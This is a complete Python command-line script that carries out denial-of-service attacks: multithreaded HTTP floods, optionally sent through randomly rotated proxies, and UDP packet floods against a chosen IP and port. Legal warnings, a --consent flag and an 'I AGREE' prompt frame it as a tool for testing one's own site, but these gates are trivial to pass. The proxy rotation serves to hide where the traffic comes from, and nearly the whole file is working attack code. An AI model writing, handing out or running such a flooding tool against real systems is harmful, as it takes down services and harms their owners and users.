
import argparse
import threading
import time
import requests
import sys
import urllib.parse
import socket
import random
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format="[%(asctime)s] %(levelname)s: %(message)s")

def validate_url(url):
    try:
        result = urllib.parse.urlparse(url)
        return all([result.scheme, result.netloc])
    except ValueError:
        return False

def get_proxies(proxy_file):
    proxies = []
    try:
        with open(proxy_file, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    proxies.append(line)
    except FileNotFoundError:
        logging.warning(f"Proxy file not found: {proxy_file}. Proceeding without proxies.")
    return proxies

def http_flood(target_url, requests_per_thread, duration, thread_id):
    logging.info(f"[Thread {thread_id}] Starting HTTP flood on {target_url} for {duration} seconds...")
    start_time = time.time()
    request_count = 0
    while time.time() - start_time < duration:
        try:
            response = requests.get(target_url, timeout=5)
            request_count += 1
            # logging.info(f"[Thread {thread_id}] Request successful: {response.status_code}")
        except requests.exceptions.RequestException as e:
            logging.error(f"[Thread {thread_id}] Request failed: {e}")
            pass
        time.sleep(1 / requests_per_thread) # Control rate per thread
    logging.info(f"[Thread {thread_id}] Finished. Sent {request_count} requests.")

def http_flood_with_proxies(target_url, requests_per_thread, duration, thread_id, proxies):
    logging.info(f"[Thread {thread_id}] Starting HTTP flood with proxies on {target_url} for {duration} seconds...")
    start_time = time.time()
    request_count = 0
    while time.time() - start_time < duration:
        proxy = None
        if proxies:
            proxy = {'http': random.choice(proxies), 'https': random.choice(proxies)}
        try:
            response = requests.get(target_url, timeout=5, proxies=proxy)
            request_count += 1
            # logging.info(f"[Thread {thread_id}] Request successful: {response.status_code}")
        except requests.exceptions.RequestException as e:
            logging.error(f"[Thread {thread_id}] Request failed: {e}")
            pass
        time.sleep(1 / requests_per_thread) # Control rate per thread
    logging.info(f"[Thread {thread_id}] Finished. Sent {request_count} requests.")

def udp_flood(target_ip, target_port, duration, thread_id):
    logging.info(f"[Thread {thread_id}] Starting UDP flood on {target_ip}:{target_port} for {duration} seconds...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = b"\x00" * 1024  # 1KB of data
    start_time = time.time()
    packet_count = 0
    while time.time() - start_time < duration:
        try:
            sock.sendto(bytes_to_send, (target_ip, target_port))
            packet_count += 1
        except Exception as e:
            logging.error(f"[Thread {thread_id}] UDP send failed: {e}")
            pass
    logging.info(f"[Thread {thread_id}] Finished. Sent {packet_count} UDP packets.")

def main():
    parser = argparse.ArgumentParser(
        description="\nWARNING: This tool is for legitimate DDoS testing of your OWN website with EXPLICIT PERMISSION only. Misuse is illegal.\n",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument('--target', type=str, required=True, help='The target URL (e.g., http://example.com) or IP:PORT for UDP')
    parser.add_argument('--duration', type=int, default=60, help='Duration of the test in seconds (default: 60)')
    parser.add_argument('--threads', type=int, default=10, help='Number of concurrent threads (default: 10)')
    parser.add_argument('--rate', type=int, default=10, help='Requests/packets per second per thread (default: 10)')
    parser.add_argument('--attack-type', type=str, default='http-flood', choices=['http-flood', 'udp-flood'],
                        help='Type of DDoS attack (default: http-flood)')
    parser.add_argument('--proxy-file', type=str, help='Path to a file containing a list of proxies (one per line)')
    parser.add_argument('--log-file', type=str, help='Path to a log file to record test results')
    parser.add_argument('--consent', action='store_true', required=True,
                        help='REQUIRED: Acknowledge and consent to ethical and legal use of this tool. Misuse is illegal.')

    args = parser.parse_args()

    if not args.consent:
        print("Error: You must provide --consent to acknowledge ethical and legal use.")
        sys.exit(1)

    if args.log_file:
        file_handler = logging.FileHandler(args.log_file)
        file_handler.setLevel(logging.INFO)
        formatter = logging.Formatter("[%(asctime)s] %(levelname)s: %(message)s")
        file_handler.setFormatter(formatter)
        logging.getLogger().addHandler(file_handler)

    print("\n=====================================================================")
    print("WARNING: This tool is for legitimate DDoS testing of your OWN website with EXPLICIT PERMISSION only.")
    print("         Misuse of this tool against any unauthorized target is illegal and can lead to severe penalties.")
    print("         By proceeding, you confirm you have explicit written permission for testing on your target.")
    print("=====================================================================\n")

    confirmation = input("Type 'I AGREE' to confirm you understand and accept the terms: ")
    if confirmation.upper() != 'I AGREE':
        print("Confirmation failed. Exiting.")
        sys.exit(1)

    target_func = None
    target_args_base = []

    proxies = []
    if args.proxy_file:
        proxies = get_proxies(args.proxy_file)
        if not proxies and args.attack_type == 'http-flood': # Only warn if http-flood and proxies were intended
            logging.warning("No proxies loaded. Proceeding without proxies for HTTP flood.")

    if args.attack_type == 'http-flood':
        if not validate_url(args.target):
            print(f"Error: Invalid target URL for HTTP flood: {args.target}")
            sys.exit(1)
        if proxies:
            target_func = http_flood_with_proxies
            target_args_base = [args.target, args.rate, args.duration, proxies]
            logging.info(f"Starting HTTP flood with proxies on {args.target} for {args.duration} seconds with {args.threads} threads at {args.rate} req/s/thread...")
        else:
            target_func = http_flood
            target_args_base = [args.target, args.rate, args.duration]
            logging.info(f"Starting HTTP flood test on {args.target} for {args.duration} seconds with {args.threads} threads at {args.rate} req/s/thread...")
    elif args.attack_type == 'udp-flood':
        try:
            target_parts = args.target.split(':')
            target_ip = target_parts[0]
            target_port = int(target_parts[1]) if len(target_parts) > 1 else 80 # Default UDP port
            socket.inet_aton(target_ip) # Validate IP format
        except (socket.error, ValueError):
            print(f"Error: Invalid target for UDP flood. Use format IP:PORT (e.g., 192.168.1.1:53)")
            sys.exit(1)
        target_func = udp_flood
        target_args_base = [target_ip, target_port, args.duration]
        logging.info(f"Starting UDP flood test on {target_ip}:{target_port} for {args.duration} seconds with {args.threads} threads...")
    else:
        print("Error: Invalid attack type.")
        sys.exit(1)

    threads = []
    for i in range(args.threads):
        thread = threading.Thread(target=target_func, args=(*target_args_base, i))
        threads.append(thread)
        thread.start()

    try:
        for thread in threads:
            thread.join()
    except KeyboardInterrupt:
        logging.info("\nTest interrupted by user. Attempting to stop threads...")
        # In a real scenario, you'd need a more robust way to signal threads to stop
        # For this simple example, KeyboardInterrupt will just stop the main thread
        # and the child threads will continue until their duration is met or they error out.
        # A global flag or Event object would be better for graceful shutdown.

    logging.info("DDoS test finished.")

if __name__ == '__main__':
    main()

